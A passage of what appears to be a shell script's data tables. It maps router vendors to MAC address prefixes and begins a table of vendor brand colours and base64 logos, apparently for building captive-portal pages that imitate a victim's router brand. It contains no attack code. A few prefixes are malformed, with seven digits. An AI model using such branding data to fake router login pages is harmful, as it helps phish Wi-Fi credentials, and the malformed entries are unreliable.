										["Comtrend"]="001D20 0030DA 1C6499 3872C0 64680C C8D12A D8B6B7 F88E85"
										["D-Link"]="00AD24 0CB6D2 1062EB 10BEF5 14D64D 180F76 1C5F2B 1C7EE5 1CAFF7 1CBDB9 28107B 283B82 3C1E04 409BCD 48EE0C 54B80A 58D56E 60634C 6C198F 6C7220 7062B8 74DADA 78321B 78542E 802689 84C9B2 908D78 9094E4 9CD643 A0AB1B ACF1DF B0C554 B8A386 BC0F9A BCF685 C0A0BB C412F5 C4A81D C4E90A C8BE19 C8D3A3 CCB255 D8FEE3 E46F13 E8CC18 EC2280 ECADE0 F0B4D2 F48CEB F8E903 FC7516"
										["Edimax"]="0000B4 000E2E 001F1F 0050FC 08BEAC 74DA38 801F02"
										["Fortinet"]="00090F 000CE6 04D590 085B0E 704CA5 906CAC E023FF E81CBA"
										["Hewlett-Packard"]="0001E6 0001E7 0002A5 0004EA 000802 000883 0008C7 000A57 000BCD 000D9D 000E7F 000EB3 000F20 000F61 001083 0010E3 00110A 001185 001279 001321 001438 0014C2 001560 001635 001708 0017A4 001871 0018FE 0019BB 001A4B 001B78 001CC4 001E0B 001F29 00215A 002264 00237D 002481 0025B3 002655 00306E 0030C1 004E35 00508B 0060B0 00805F 0080A0 009C02 00FD45 040973 080009 082E5F 089734 08F1EA 101F74 10604B 1062E5 10E7C6 1402EC 1458D0 186024 18A905 1C98EC 1CC1DE 20677C 20A6CD 24BE05 24F27F 288023 28924A 2C233A 2C27D7 2C4138 2C44FD 2C59E5 2C768A 308D99 30E171 3464A9 34FCB9 3817C3 3863BB 38EAA7 3C4A92 3C5282 3CA82A 3CD92B 40A8F0 40B034 40B93C 441EA1 443192 4448C1 480FCF 484AE9 48BA4E 48DF37 4CAEA3 5065F3 548028 5820B1 5C8A38 5CB901 5CBA2C 643150 645106 68B599 6C3BE5 6CC217 70106F 705A0F 7446A0 784859 78ACC0 78E3B5 78E7D1 8030E0 808DB7 80C16E 80CE62 80E82C 843497 84A93E 8851FB 88E9A4 8CDCD4 904C81 941882 943FC2 9440C9 9457A5 94F128 984BE1 98E7F4 98F2B3 9C7BEF 9C8CD8 9C8E99 9CB654 9CDC71 A01D48 A02BB8 A0481C A08CFD A0B3CC A0D3C1 A45D36 A8BD27 AC162D ACE2D3 B00CD1 B05ADA B0B867 B47AF1 B499BA B4B52F B4B686 B88303 B8AF67 BCEAFA C4346B C46516 C8B5AD C8CBB8 C8D3FF C8D9D2 CC3E5F D06726 D07E28 D0BF9C D48564 D4C9EF D4F5EF D89403 D89D67 D8D385 DC4A3E DC680C E0071B E4115B E4E749 E83935 E8F724 EC8EB5 EC9A74 EC9B8B ECB1D7 ECEBB8 F0921C F40343 F430B9 F43909 F4CE46 F8B46A FC15B4 FC3FDB"
										["Huawei"]="001882 001E10 002568 00259E 002EC7 0034FE 00464B 005A13 00664B 009ACD 00BE3B 00E0FC 00F81C 04021F 0425C5 042758 043389 044A6C 044F4C 047503 047970 04885F 048C16 049FCA 04B0E7 04BD70 04C06F 04F938 04FE8D 0819A6 08318B 084F0A 086361 087A4C 08C021 08E84F 0C2C54 0C37DC 0C41E9 0C45BA 0C704A 0C8FFF 0C96BF 0CB527 0CC6CC 0CD6BD 100177 101B54 104400 104780 105172 10B1F8 10C172 10C3AB 10C61F 1409DC 1413FB 143004 143CC3 14579F 145F94 149D09 14A0F8 14A51A 14B968 14D11F 14D169 18022D 183D5E 185644 18C58A 18CF24 18D276 18DED7 1C151F 1C1D67 1C20DB 1C4363 1C599B 1C6758 1C7F2C 1C8E5C 1CAECB 1CB796 2008ED 200BC7 20283E 202BC1 203DB2 2054FA 20658E 20A680 20AB48 20DA22 20F17C 20F3A3 2400BA 240995 24166D 241FA0 242E02 243154 244427 244C07 2469A5 247F3C 249EAB 24A52C 24BCF8 24DA33 24DBAC 24DF6A 24FB65 2811EC 283152 283CE4 2841C6 285FDB 286ED4 289E97 28A6DB 28B448 28DEE5 28E34E 2C1A01 2C55D3 2C58E8 2C97B1 2C9D1E 2CAB00 2CCF58 304596 307496 308730 30A1FA 30C50F 30D17E 30E98E 30F335 30FBB8 30FD65 3400A3 340A98 3412F9 341E6B 342912 342EB6 346AC2 346BD3 347916 34A2A2 34B354 34CDBE 38378B 3847BC 384C4F 38881E 38BC01 38EB47 38F889 38FB14 3C15FB 3C306F 3C4711 3C678C 3C7843 3C9D56 3CCD5D 3CDFBD 3CE824 3CF808 3CFA43 404D8E 407D0F 40CBA8 40EEDD 44004D 4455B1 4459E3 446747 446A2E 446EE5 447654 4482E5 44A191 44C346 44D791 480031 482CD0 483C0C 483FE9 48435A 4846FB 485702 486276 487B6B 488EEF 48AD08 48D539 48DB50 48DC2D 48F8DB 48FD8E 4C1FCC 4C5499 4C8BEF 4CB16C 4CD0CB 4CD1A1 4CF55B 4CF95D 4CFB45 50016B 5001D9 5004B8 501D93 50464A 505DAC 50680A 506F77 509F27 50A72B 541310 5425EA 5434EF 5439DF 54511B 548998 549209 54A51B 54B121 54BAD6 581F28 582575 582AF7 58605F 587F66 58BAD4 58D759 58F987 5C0339 5C0979 5C4CA9 5C546D 5C7D5E 5C9157 5CA86A 5CB395 5CB43E 5CC307 5CE883 5CF96A 600810 60123C 602E20 607ECD 608334 60D755 60DE44 60DEF3 60E701 60F18A 60FA9D 6416F0 642CAC 643E8C 646D6C 64A651 684AAE 6889C1 688F84 68A03E 68A0F6 68A828 68CC6E 68E209 6C1632 6CB749 6CEBB6 70192F 702F35 7054F5 70723C 707990 707BE8 708A09 708CB6 70A8E3 70C7F2 70D313 70FD45 745909 745AAA 7460FA 74882A 749D8F 74A063 74A528 74C14F 74D21D 7817BE 781DBA 785773 785860 786256 786A89 78B46A 78D752 78F557 78F5FD 7C11CB 7C1CF1 7C6097 7C7668 7C7D3D 7C942A 7CA177 7CA23E 7CB15D 7CC385 7CD9A0 801382 8038BC 804126 806933 80717A 807D14 80B575 80B686 80D09B 80D4A5 80E1BF 80FB06 8421F1 843E92 8446FE 844765 845B12 847637 849FB5 84A8E4 84A9C4 84AD58 84BE52 84DBAC 88108F 881196 8828B3 883FD3 884033 88403B 884477 8853D4 886639 888603 88A2D7 88BCC1 88BFE4 88CEFA 88CF98 88E3AB 88F56E 88F872 8C0D76 8C15C7 8C2505 8C34FD 8C426D 8C683A 8C6D77 8CE5EF 8CEBC6 8CFD18 900325 9016BA 90173F 9017AC 9017C8 902BD2 903FEA 904E2B 90671C 909497 9400B0 94049C 940B19 940E6B 942533 94772B 94D00D 94DBDA 94E7EA 94FE22 9835ED 9844CE 989C57 98E7F5 9C1D36 9C28EF 9C37F4 9C52F8 9C69D1 9C713A 9C741A 9C7DA3 9CB2B2 9CC172 9CE374 A0086F A01C8D A057E3 A08CF8 A08D16 A0A33B A0DF15 A0F479 A400E2 A416E7 A47174 A4933F A49947 A49B4F A4BA76 A4BDC4 A4BE2B A4C64F A4CAA0 A4DCBE A80C63 A82BCD A8494D A87D12 A8C83A A8CA7B A8E544 A8F5AC AC075F AC4E91 AC6089 AC6175 AC751D AC853D AC8D34 AC9232 ACB3B5 ACCF85 ACE215 ACE342 ACE87B ACF970 B00875 B05508 B05B67 B0761B B08900 B0E17E B0E5ED B0EB57 B40931 B41513 B43052 B44326 B46E08 B48655 B4B055 B4CD27 B4F58E B4FBF9 B808D7 B89436 B8BC1B B8C385 B8E3B1 BC25E0 BC3D85 BC3F8F BC620E BC7574 BC7670 BC9C31 BCB0E7 BCE265 C07009 C0BFC0 C0F4E6 C0FFA8 C40528 C40683 C4072F C4447D C4473F C467D1 C486E9 C49F4C C4A402 C4B8B4 C4F081 C4FF1F C80CC8 C81451 C81FBE C850CE C85195 C88D83 C894BB C8A776 C8C2FA C8C465 C8D15E CC0577 CC53B5 CC64A6 CC96A0 CCA223 CCBBFE CCCC81 CCD73C D016B4 D02DB3 D03E5C D065CA D06F82 D07AB5 D0C65B D0D04B D0D783 D0EFC1 D0FF98 D440F0 D44649 D4612E D462EA D46AA8 D46BA6 D46E5C D494E8 D4A148 D4B110 D4F9A1 D82918 D8490B D89B3B D8C771 DC094C DC16B2 DC21E2 DC729B DC9088 DC9914 DCC64B DCD2FC DCD916 DCEE06 E00084 E0191D E0247F E02481 E02861 E03676 E09796 E0A3AC E0CC7A E40EEE E419C1 E43493 E435C8 E43EC6 E468A3 E472E2 E47E66 E48326 E4A7C5 E4A8B6 E4C2D1 E4FB5D E4FDA1 E8088B E84DD0 E86819 E884C6 E8ABF3 E8BDD1 E8CD2D EC233D EC388F EC4D47 EC5623 EC8914 EC8C9A ECC01B ECCB30 F00FEC F02FA7 F033E5 F03F95 F04347 F063F9 F09838 F09BB8 F0C850 F0E4A2 F41D6B F44C7F F4559C F4631F F47960 F48E92 F49FF3 F4A4D6 F4B78D F4BF80 F4C714 F4CB52 F4DCF9 F4DEAF F4E3FB F4E5F2 F80113 F823B2 F83DFF F84ABF F86EEE F87588 F898B9 F898EF F89A78 F8BF09 F8C39E F8E811 FC1BD1 FC3F7C FC48EF FC8743 FC9435 FCAB90 FCBCD1 FCE33C"
										["Juniper"]="000585 0010DB 00121E 0014F6 0017CB 0019E2 001BC0 001DB5 001F12 002159 002283 00239C 0024DC 002688 003146 009069 045C6C 0881F4 0C599C 0C8126 0C8610 100E7E 1039E9 182AD3 1C9C8C 201BC9 204E71 20D80B 288A1C 28A24B 28C0DA 2C2131 2C2172 2C6BF5 307C5E 30B64F 384F49 3C6104 3C8AB0 3C8C93 3C94D5 407183 40A677 40B4F0 40DEAD 44AA50 44ECCE 44F477 4C16FC 4C9614 50C58D 50C709 541E56 544B8C 54E032 5800BB 5C4527 5C5EAB 64649B 648788 64C3D6 7819F7 784F9B 78507C 78FE3D 7C2586 7CE2CA 80711F 807FF8 80ACAC 841888 84B59C 84C1C1 88A25E 88D98F 88E0F3 88E64B 94BF94 94F7AD 9C8ACB 9CCC83 A8D0E5 AC4BC8 B033A6 B0A86E B0C69A B8C253 C00380 C042D0 C0535E C0BFA7 C8E7F0 CCE17F CCE194 D007CA D0DD49 D404FF D818D3 D8B122 DC38E1 E45D37 E4FC82 E8B6C2 EC13DB EC3873 EC3EF7 F01C2D F04B3A F07CC7 F4A739 F4B52F F4CC55 F8C001 FC3342 E08B258"
										["Linksys"]="000C41 000E08 000F66 001217 001310 0014BF 0016B6 001839 0018F8 001A70 001C10 001D7E 001EE5 002129 00226B 002369 00259C 20AA4B 48F8B3 586D8F 687F74 98FC11 C0C1C0 C8B373 C8D719"
										["Mitrastar"]="0C4C39 345760 84AA9C 9897D1 A433D7 ACC662 B046FC B8FFB3 C03DD9 CCD4A1 CCEDDC D8C678 E04136 E4AB89"
										["Motorola"]="000E5C 04D395 08AA55 08CC27 0CCB85 141AA3 1430C6 1C56FE 2446C8 24DA9B 304B07 34BB26 3880DF 40786A 408805 441C7F 4480EB 58D9C3 5C5188 601D91 60BEB5 68C44D 8058F8 806C1B 84100D 88797E 88B4A6 8CF112 9068C3 90735A 9CD917 A470D6 A89675 B07994 BC98DF BCFFEB C08C71 C8C750 CC0DF2 CC61E5 CCC3EA D00401 D07714 D463C6 D4C94B DCBFE9 E0757D E09861 E4907E E89120 EC8892 F0D7AA F4F1E1 F4F524 F81F32 F8CFC5 F8E079 F8F1B6"
										["Netgear"]="00095B 000FB5 00146C 00184D 001B2F 001E2A 001F33 00223F 0024B2 0026F2 008EF2 04A151 08028E 0836C9 08BD43 100C6B 100D7F 10DA43 1459C0 200CC8 204E7F 20E52A 288088 28C68E 2C3033 2CB05D 30469A 3894ED 3C3786 405D82 4494FC 44A56E 4C60DE 504A6E 506A03 6CB0CE 744401 78D294 803773 841B5E 8C3BAD 9C3DCF 9CC9EB 9CD36D A00460 A021B7 A040A0 A06391 A42B8C B03956 B07FB9 B0B98A BCA511 C03F0E C0FFD4 C40415 C43DC7 CC40D0 DCEF09 E0469A E091F5 E4F4C6 E8FCAF F87394"
										["Samsung"]="0000F0 0007AB 001247 0012FB 001377 001599 0015B9 001632 00166B 00166C 0016DB 0017C9 0017D5 0018AF 001A8A 001B98 001C43 001D25 001DF6 001E7D 001EE1 001EE2 001FCC 001FCD 00214C 0021D1 0021D2 002339 00233A 002399 0023D6 0023D7 002454 002490 002491 0024E9 002566 002567 00265D 00265F 006F64 0073E0 007C2D 008701 00B5D0 00BF61 00C3F4 00E3B2 00F46F 00FA21 04180F 041BBA 04B1A1 04B429 04BA8D 04BDBF 04FE31 0808C2 0821EF 08373D 083D88 087808 088C2C 08AED6 08BFA0 08D42B 08ECA9 08EE8B 08FC88 08FD0E 0C1420 0C2FB0 0C715D 0C8910 0CA8A7 0CB319 0CDFA4 0CE0DC 1007B6 101DC0 1029AB 103047 103917 103B59 1077B1 1089FB 108EE0 109266 10D38A 10D542 140152 141F78 1432D1 14568E 1489FD 1496E5 149F3C 14A364 14B484 14BB6E 14F42A 1816C9 1819D6 181EB0 182195 18227E 182666 183A2D 183F47 184617 184ECB 1854CF 1867B0 188331 18895B 18E2C2 1C232C 1C3ADE 1C5A3E 1C62B8 1C66AA 1CAF05 2013E0 202D07 20326C 205531 205EF7 206E9C 20D390 20D5BF 244B03 244B81 245AB5 2468B0 24920E 24C696 24DBED 24F5AA 24FCE5 2802D8 2827BF 28395E 288335 28987B 28BAB5 28CC01 2C4053 2C4401 2CAE2B 2CBABA 301966 306A85 3096FB 30C7AE 30CBF8 30CDA7 30D587 30D6C9 34145F 342D0D 343111 348A7B 34AA8B 34BE00 34C3AC 380195 380A94 380B40 3816D1 382DD1 382DE8 3868A4 386A77 389496 389AF6 38D40B 38ECE4 3C0518 3C20F6 3C576C 3C5A37 3C6200 3C8BFE 3CA10D 3CBBFD 3CDCBC 3CF7A4 40163B 40D3AE 444E1A 445CE9 446D6C 44783E 44F459 48137E 4827EA 4844F7 4849C7 485169 48794D 489DD1 48C796 4C3C16 4CA56D 4CBCA5 4CC95E 4CDD31 5001BB 503275 503DA1 5050A4 5056BF 507705 508569 5092B9 509EA7 50A4C8 50B7C3 50C8E5 50F0D3 50F520 50FC9F 54219D 5440AD 5492BE 549B12 54B802 54BD79 54F201 54FA3E 54FCF0 58B10F 58C38B 58C5CB 5C2E59 5C3C27 5C497D 5C5181 5C865C 5C9960 5CC1D7 5CCB99 5CE8EB 5CF6DC 60684E 606BBD 6077E2 608E08 608F5C 60A10A 60A4D0 60AF6D 60C5AD 60D0A9 641CAE 641CB0 646CB2 647791 647BCE 6489F1 64B310 64B853 680571 682737 684898 685ACF 687D6B 68BFC4 68E7C2 68EBAE 6C006B 6C2F2C 6C2F8A 6C8336 6CB7F4 6CDDBC 6CF373 701F3C 70288B 702AD5 705AAC 70CE8C 70F927 70FD46 74458A 749EF5 74EB80 78009E 781FDB 782327 7825AD 7840E4 78471D 78521A 78595E 789ED0 78A873 78ABBB 78BDBC 78C3E9 78F7BE 7C0BC6 7C1C68 7C2302 7C2EDD 7C38AD 7C6456 7C787E 7C8956 7C8BB5 7C9122 7CF854 7CF90E 8018A7 8020FD 8031F0 804E70 804E81 805719 80656D 807B3E 8086D9 80CEB9 8425DB 842E27 845181 8455A5 849866 84A466 84B541 84C0EF 88299C 887598 888322 889B39 889F6F 88A303 88ADD2 88BD45 8C1ABF 8C71F8 8C7712 8C79F5 8C83E1 8CBFA6 8CC8CD 8CE5C0 9000DB 900628 90633B 9097F3 90B144 90EEC7 90F1AA 9401C2 942DDC 94350A 945103 9463D1 9476B7 947BE7 948BC1 94B10A 94D771 98063C 981DFA 98398E 9852B1 9880EE 988389 9C0298 9C2A83 9C3AAF 9C65B0 9C8C6E 9CA513 9CD35B 9CE063 9CE6E7 A00798 A01081 A02195 A027B6 A06090 A07591 A0821F A0AC69 A0B4A5 A0CBFD A407B6 A4307A A46CF1 A48431 A49A58 A4D990 A4EBD3 A80600 A816D0 A82BB9 A8346A A8515B A87C01 A88195 A887B3 A89FBA A8F274 AC1E92 AC3613 AC5A14 ACAFB9 ACC33A ACEE9E B047BF B06FE0 B0C4E7 B0C559 B0D09C B0DF3A B0EC71 B41A1D B43A28 B46293 B47443 B4BFF6 B4CE40 B4EF39 B857D8 B85A73 B85E7B B86CE8 B8BBAF B8BC5B B8C68E B8D9CE BC1485 BC20A4 BC4486 BC4760 BC5451 BC72B1 BC765E BC79AD BC7ABF BC851F BCA58B BCB1F3 BCD11F BCE63F C01173 C0174D C048E6 C06599 C087EB C08997 C0BDC8 C0D2DD C0D3C0 C0DCDA C44202 C45006 C4576E C462EA C4731E C488E5 C493D9 C4AE12 C81479 C819F7 C83870 C87E75 C8A823 C8D7B0 CC051B CC07AB CC2119 CC464E CC6EA4 CCB11A CCF9E8 CCFE3C D003DF D0176A D03169 D059E4 D0667B D07FA0 D087E2 D0B128 D0C1B1 D0D003 D0DFC7 D0FCCC D411A3 D47AE2 D487D8 D48890 D48A39 D49DC0 D4AE05 D4E6B7 D4E8B2 D80831 D80B9A D831CF D85575 D857EF D85B2A D868C3 D890E8 D8C4E9 D8E0E1 DC44B6 DC6672 DC74A8 DC8983 DCCF96 DCDCE2 DCF756 E09971 E0AA96 E0CBEE E0D083 E0DB10 E4121D E432CB E440E2 E458B8 E458E7 E45D75 E47CF9 E47DBD E492FB E4B021 E4E0C5 E4F3C4 E4F8EF E4FAED E8039A E81132 E83A12 E84E84 E89309 E8B4C8 E8E5D6 EC107B ECAA25 ECE09B F008F1 F05A09 F05B7B F06BCA F0728C F08A76 F0E77E F0EE10 F40E22 F4428F F47190 F47B5E F47DEF F49F54 F4C248 F4D9FB F4FEFB F83F51 F877B8 F884F2 F8D0BD F8E61A F8F1E6 FC039F FC1910 FC4203 FC643A FC8F90 FCA13E FCA621 FCAAB6 FCC734 FCDE90 FCF136"
										["SMC"]="0004E2 000BC5 0013F7 00222D 0023C6 0026F3 004027 78CD8E 849D64 B89BC9 C4393A E4956E0"
										["Sphairon"]="001C28"
										["Technicolor"]="2C301A F01628 101331 20B001 30918F 589835 705A9E 9C9726 A0B53C A491B1 A4B1E9 C4EA1D D4351D D4925E E0B9E5"
										["Teldat"]="001967 00A026"
										["TP-Link"]="000AEB 001478 0019E0 001D0F 002127 0023CD 002586 002719 081F71 085700 0C4B54 0C722C 0C8063 0C8268 10FEED 147590 148692 14CC20 14CF92 14E6E4 18A6F7 18D6C7 1C3BF3 1C4419 1CFA68 206BE7 20DCE6 246968 282CB2 28EE52 30B49E 30B5C2 30FC68 349672 34E894 388345 3C46D8 40169F 403F8C 44B32D 480EEC 487D2E 503EAA 50BD5F 50C7BF 50D4F7 50FA84 547595 54A703 54C80F 54E6FC 5C63BF 5C899A 603A7C 60E327 645601 6466B3 646E97 647002 68FF7B 6CE873 704F57 7405A5 74DA88 74EA3A 7844FD 78A106 7C8BCA 7CB59B 808917 808F1D 8416F9 882593 8C210A 8CA6DF 90AE1B 90F652 940C6D 94D9B3 984827 98DAC4 98DED0 9C216A 9CA615 A0F3C1 A42BB0 A8154D A8574E AC84C6 B0487A B04E26 B09575 B0958E B0BE76 B8F883 BC4699 BCD177 C025E9 C04A00 C06118 C0E42D C46E1F C47154 C4E984 CC08FB CC32E5 CC3429 D03745 D076E7 D0C7C0 D4016D D46E0E D807B6 D80D17 D8150D D84732 D85D4C DC0077 DCFE18 E005C5 E4D332 E894F6 E8DE27 EC086B EC172F EC26CA EC888F F0F336 F483CD F4EC38 F4F26D F81A67 F8D111 FCD733"
										["Ubiquiti"]="00156D 002722 0418D6 18E829 24A43C 44D9E7 687251 68D79A 7483C2 74ACB9 788A20 802AA8 B4FBE4 DC9FDB E063DA F09FC2 F492BF FCECDA"
										["Vantiva"]="F85E42"
										["Xavi"]="000138 E09153"
										["ZTE"]="000947 0015EB 0019C6 001E73 002293 002512 0026ED 004A77 041DC7 049573 08181A 083FBC 086083 0C1262 0C3747 0C72D9 10D0AB 143EBF 146080 146B9A 18132D 1844E6 18686A 1C2704 208986 20E882 24586E 247E51 24C44A 24D3F2 287B09 288CB8 28FF3E 2C26C5 2C957F 300C23 304240 309935 30D386 30F31D 343759 344B50 344DEA 346987 347839 34DAB7 34DE34 34E0CF 384608 386E88 38D82F 38E1AA 38E2DD 3CDA2A 3CF652 4413D0 44F436 44FB5A 44FFBA 48282F 4859A4 48A74E 4C09B4 4C16F1 4C494F 4CABFC 4CAC0A 4CCBF5 5078B3 50AF4D 540955 5422F8 54BE53 585FF6 5C3A3D 601466 601888 6073BC 64136C 681AB2 688AF0 689FF0 6C8B2F 6CA75F 6CD2BA 702E22 709F2D 744AA4 749781 74A78E 74B57E 781D4A 78312B 789682 78C1A7 78E8B6 7C3953 80B07B 84139F 841C70 84742A 847460 885DFB 88D274 8C14B4 8C68C8 8C7967 8CDC02 8CE081 8CE117 901D27 90869B 90C7D8 90D8F3 90FD73 949869 94A7B7 94BF80 94E3EE 98006A 981333 986CF5 98F428 98F537 9C2F4E 9C63ED 9C6F52 9CA9E4 9CD24B 9CE91C A091C8 A0EC80 A44027 A47E39 A4F33B A8A668 AC00D0 AC6462 B00AD5 B075D5 B0ACD2 B0B194 B0C19E B41C30 B49842 B4B362 B4DEDF B805AB BC1695 C09FE1 C0B101 C0FD84 C4741E C4A366 C85A9F C864C7 C87B5B C8EAF8 CC1AFA CC7B35 D0154A D058A8 D05BA8 D0608C D071C4 D437D7 D47226 D476EA D49E05 D4B709 D4C1C8 D855A3 D87495 D8A8C8 DC028E DC7137 DCDFD6 DCF8B9 E01954 E0383F E07C13 E0C3F3 E447B3 E47723 E47E9A E4BD4B E4CA12 E8A1F8 E8ACAD E8B541 EC1D7F EC237B EC6CB5 EC8263 EC8A4C ECF0FE F084C9 F41F88 F46DE2 F4B5AA F4B8A7 F4E4AD F80DF0 F8A34F F8DFA8 FC2D5E FC94CE FCC897"
									)

		declare -gA cp_router_colors=(
										["Alfa_Networks"]='#003399 #4B4B49 #CCCCCC data:image/png;base64,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'
										["Arris"]='#CC0000 #000000 #999999 data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAyAAAABOCAYAAADYZnLfAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAABmJLR0QAAAAAAAD5Q7t/AAAAB3RJTUUH5goRAhwD0iai7QAAYshJREFUeNrtfXecXFXd/vOce2dme0nZbJ8t6SEhCaH3IoiIWF71tffys6AoKiodRBRFhdcCIvqKWOBFVIpKkSJVSippm+0tm+19d+be8/z+mNlkEwJkNwlskvt8PkvY2Zk7957v93zP9znnW4gAByQKZ52J7JlHpcqYDEOlyCpMgCCtAF+wPqxECAINSQLcgysLoAygPbwTUiKxx+8GJXACj0pgz99PQyr5GPvj+on3cqL3v2f3QwCQ2dO7oQTScff4YQVa0dnjO5cMjSbyfsqYiV1/IvcDkQYTeD+NuMeyJURDybzK+AkArBEdGsfQceI+DOgbQqJVO4Tn1q+7uhc4EsBzB6XtOcEArcVlbwJxMYCs3Wi3Q+AxSVdWN9R3BNb6tXFersH6jJJsC+WDIDgBCzZRiLKQNaAPwLOCJypOMGZgRl0/Nb6peb19BQulcfZSh6q8ZpeWzRQ0HdT+lBMkWFGWpE/AA+RZIO77JuZYbzR9IMVb17fFvuracwjKqqyg3DEhFZLIlWD3VEqJlV0EMELDhuq6utEDeBheNk/Lo6XZFGcIyCdZSWA+wHJAxQDyIOQCyAQR2Y1fJAmjBIZADAIYANBDoFPgVgINgGolNQvYZqVuOuyprasfeqV7cgPTf2AiFIrQMSbdI0oFREFGARQBmAUg1zGRkHFDfsJNtQayhJSgIy+zTbsoLeEkJ+EeEhCYPXXiSVCYgBMpGOBVnMLd3T1gJjCUZmLvl5kQARGciRAcJZ51D8dSCSd7TwkdRcM9l9WYMzmRsScmQFhIJsju/pIVDCVO6Pqk0U5rdkKhEi8bkjKUz7jPXsC0pYXivVZ+bdw3G0EM7RDF2QctAWktLi2gwWcBnvgqjk0RwNWlhaX/29DS4B/KzuqezITN8QhgeBrJbyc3OfbXeAmEdQCPwKiAEQcYRuKnH0CPx6H+ytJoF8B2AN2gugC2jcJ2NdU3jO4iy0OSjIh8nyE/KsDuR/dRBHwAHoBRAMMEhkkMG6IPcvuGcr2+ipyyDkAdJLoBdPrAtmEv3t3W3BLfzUabDglZhZBujDkf0Hkk/AnND9ABsF7Q1wFUHcDkQwAwN1qa61suBLGYNEtBLJJUDmAmSXf72wUqYXb4Kit2CoAIydzx855JdgLAA9ljyFYD1AOoqiwrW2+tNstyc11T3bbxFwwIyAGKusa/6Xc/9T